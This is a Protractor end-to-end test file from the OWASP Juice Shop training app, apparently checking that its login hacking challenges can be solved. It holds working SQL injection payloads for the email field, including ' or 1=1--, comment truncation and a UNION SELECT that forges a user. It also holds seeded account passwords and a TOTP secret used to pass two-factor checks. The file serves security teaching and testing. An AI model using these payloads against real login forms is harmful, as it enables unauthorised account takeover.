/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
import { browser, by, element, ElementFinder, protractor } from 'protractor'

const otplib = require('otplib')

describe('/#/login', () => {
  let email: ElementFinder, password: ElementFinder, loginButton: ElementFinder

  beforeEach(() => {
    void browser.get(`${protractor.basePath}/#/login`)
    email = element(by.id('email'))
    password = element(by.id('password'))
    loginButton = element(by.id('loginButton'))
  })

  describe('challenge "loginAdmin"', () => {
    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
      void email.sendKeys('\' or 1=1--')
      void password.sendKeys('a')
      void loginButton.click()
    })

    it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', () => {
      void email.sendKeys(`admin@${config.get('application.domain')}'--`)
      void password.sendKeys('a')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Admin' })
  })

  describe('challenge "loginJim"', () => {
    it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
      void email.sendKeys(`jim@${config.get('application.domain')}'--`)
      void password.sendKeys('a')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Jim' })
  })

  describe('challenge "loginBender"', () => {
    it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', () => {
      void email.sendKeys(`bender@${config.get('application.domain')}'--`)
      void password.sendKeys('a')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Bender' })
  })

  describe('challenge "adminCredentials"', () => {
    it('should be able to log in with original (weak) admin credentials', () => {
      void email.sendKeys(`admin@${config.get('application.domain')}`)
      void password.sendKeys('admin123')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Password Strength' })
  })

  describe('challenge "loginSupport"', () => {
    it('should be able to log in with original support-team credentials', () => {
      void email.sendKeys(`support@${config.get('application.domain')}`)
      void password.sendKeys('J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Support Team' })
  })

  describe('challenge "loginRapper"', () => {
    it('should be able to log in with original MC SafeSearch credentials', () => {
      void email.sendKeys(`mc.safesearch@${config.get('application.domain')}`)
      void password.sendKeys('Mr. N00dles')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login MC SafeSearch' })
  })

  describe('challenge "loginAmy"', () => {
    it('should be able to log in with original Amy credentials', () => {
      void email.sendKeys(`amy@${config.get('application.domain')}`)
      void password.sendKeys('K1f.....................')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Amy' })
  })

  describe('challenge "dlpPasswordSpraying"', () => {
    it('should be able to log in with original Jannik credentials', () => {
      void email.sendKeys(`J12934@${config.get('application.domain')}`)
      void password.sendKeys('0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Leaked Access Logs' })
  })

  describe('challenge "twoFactorAuthUnsafeSecretStorage"', () => {
    const EC = protractor.ExpectedConditions
    let twoFactorTokenInput: ElementFinder
    let twoFactorSubmitButton: ElementFinder

    beforeEach(() => {
      twoFactorTokenInput = element(by.id('totpToken'))
      twoFactorSubmitButton = element(by.id('totpSubmitButton'))
    })

    it('should be able to log into a exsisting 2fa protected account given the right token', () => {
      void email.sendKeys(`wurstbrot@${config.get('application.domain')}'--`)
      void password.sendKeys('Never mind...')
      void loginButton.click()

      void browser.wait(EC.visibilityOf(twoFactorTokenInput), 1000, '2FA token field did not become visible')

      const totpToken = otplib.authenticator.generate('IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH')
      void twoFactorTokenInput.sendKeys(totpToken)

      void twoFactorSubmitButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Two Factor Authentication' })
  })

  describe('challenge "oauthUserPassword"', () => {
    it('should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password', () => {
      void email.sendKeys('bjoern.kimminich@gmail.com')
      void password.sendKeys('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Login Bjoern' })
  })

  describe('challenge "ghostLogin"', () => {
    it('should be able to log in as chris.pike@juice-sh.op by using `\' or deletedAt IS NOT NULL --`', () => {
      void email.sendKeys('\' or deletedAt IS NOT NULL--')
      void password.sendKeys('a')
      void loginButton.click()
    })

    it('should be able to log in as chris.pike@juice-sh.op by using `chris.pike@juice-sh.op\' --`', () => {
      void email.sendKeys(`chris.pike@${config.get('application.domain')}'--`)
      void password.sendKeys('a')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'GDPR Data Erasure' })
  })

  describe('challenge "ephemeralAccountant"', () => {
    it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
      void email.sendKeys('\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'123\' as \'deluxeToken\', \'1.2.3.4\' as \'lastLoginIp\' , \'/assets/public/images/uploads/default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--')
      void password.sendKeys('a')
      void loginButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Ephemeral Accountant' })
  })
})
